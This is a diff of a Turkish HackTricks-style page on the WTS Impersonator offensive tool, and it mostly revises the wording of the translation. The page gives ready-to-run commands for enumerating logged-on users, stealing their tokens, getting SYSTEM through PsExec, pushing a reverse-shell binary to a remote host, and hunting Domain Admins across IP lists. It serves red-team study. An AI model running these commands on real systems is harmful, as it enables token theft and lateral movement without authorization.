@@ -1,48 +1,54 @@
+# WTS Impersonator
+
 {{#include ../../banners/hacktricks-training.md}}
 
-**WTS Impersonator** aracı, **"\\pipe\LSM_API_service"** RPC İsimli borusunu kullanarak, oturum açmış kullanıcıları gizlice listeleyip, geleneksel Token Taklit tekniklerini atlayarak onların token'larını ele geçirir. Bu yaklaşım, ağlar içinde sorunsuz yan hareketler sağlamaktadır. Bu tekniğin yeniliği **Omri Baso'ya atfedilmektedir; çalışmaları [GitHub](https://github.com/OmriBaso/WTSImpersonator)** üzerinde mevcuttur.
+**WTS Impersonator** aracı, oturum açmış kullanıcıları gizlice enumerate etmek ve token'larını ele geçirmek için **"\\pipe\LSM_API_service"** RPC Named pipe'ını istismar eder; böylece geleneksel Token Impersonation tekniklerini atlatır. Bu yaklaşım, ağlar içinde sorunsuz lateral movement gerçekleştirilmesini kolaylaştırır. Bu tekniğin arkasındaki yenilik, çalışmasına [GitHub](https://github.com/OmriBaso/WTSImpersonator) üzerinden erişilebilen **Omri Baso**'ya aittir.<sup>[[1]](#references)</sup>
 
 ### Temel İşlevsellik
 
-Araç, bir dizi API çağrısı aracılığıyla çalışır:
+Araç, bir dizi API çağrısı üzerinden çalışır:
 ```bash
 WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
 ```
-### Ana Modüller ve Kullanım
+### Temel Modüller ve Kullanım
 
-- **Kullanıcıları Listeleme**: Araç ile yerel ve uzaktan kullanıcı listeleme mümkündür, her iki senaryo için de komutlar kullanılır:
+- **Kullanıcıları Enumerate Etme**: Araçla, aşağıdaki komutlar kullanılarak yerel ve uzak kullanıcı enumeration işlemleri gerçekleştirilebilir:
 
-- Yerel olarak:
+- Yerel:
 ```bash
 .\WTSImpersonator.exe -m enum
 ```
-- Uzaktan, bir IP adresi veya ana bilgisayar adı belirterek:
+- Bir IP adresi veya hostname belirterek uzak:
 ```bash
 .\WTSImpersonator.exe -m enum -s 192.168.40.131
 ```
 
-- **Komutları Çalıştırma**: `exec` ve `exec-remote` modülleri çalışmak için bir **Hizmet** bağlamına ihtiyaç duyar. Yerel yürütme, yalnızca WTSImpersonator çalıştırılabilir dosyasını ve bir komutu gerektirir:
+- **Komut Çalıştırma**: `exec` ve `exec-remote` modüllerinin çalışması için **Service** context gerekir. Yerel çalıştırma için yalnızca WTSImpersonator executable dosyası ve bir komut gerekir:
 
-- Yerel komut yürütme örneği:
+- Yerel komut çalıştırma örneği:
 ```bash
 .\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
 ```
-- Hizmet bağlamı elde etmek için PsExec64.exe kullanılabilir:
+- Bir Service context elde etmek için PsExec64.exe kullanılabilir:
 ```bash
 .\PsExec64.exe -accepteula -s cmd.exe
 ```
 
-- **Uzaktan Komut Yürütme**: PsExec.exe'ye benzer şekilde uzaktan bir hizmet oluşturmayı ve yüklemeyi içerir, uygun izinlerle yürütmeye olanak tanır.
+- **Uzak Komut Çalıştırma**: PsExec.exe'ye benzer şekilde uzaktan bir Service oluşturulmasını ve kurulmasını içerir; böylece uygun izinlerle çalıştırma yapılabilir.
 
-- Uzaktan yürütme örneği:
+- Uzak çalıştırma örneği:
 ```bash
 .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
 ```
 
-- **Kullanıcı Avlama Modülü**: Birden fazla makinede belirli kullanıcıları hedef alır, onların kimlik bilgileri altında kod yürütür. Bu, birden fazla sistemde yerel yönetici haklarına sahip Alan Yöneticilerini hedef almak için özellikle yararlıdır.
+- **User Hunting Modülü**: Birden fazla makinedeki belirli kullanıcıları hedef alarak kodu onların kimlik bilgileri altında çalıştırır. Bu, birkaç sistemde local admin haklarına sahip Domain Admins kullanıcılarını hedeflemek için özellikle kullanışlıdır.
 - Kullanım örneği:
 ```bash
 .\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
 ```
+
+## Referanslar
+
+- [1] [WTSImpersonator - GitHub](https://github.com/OmriBaso/WTSImpersonator)
 
 {{#include ../../banners/hacktricks-training.md}}
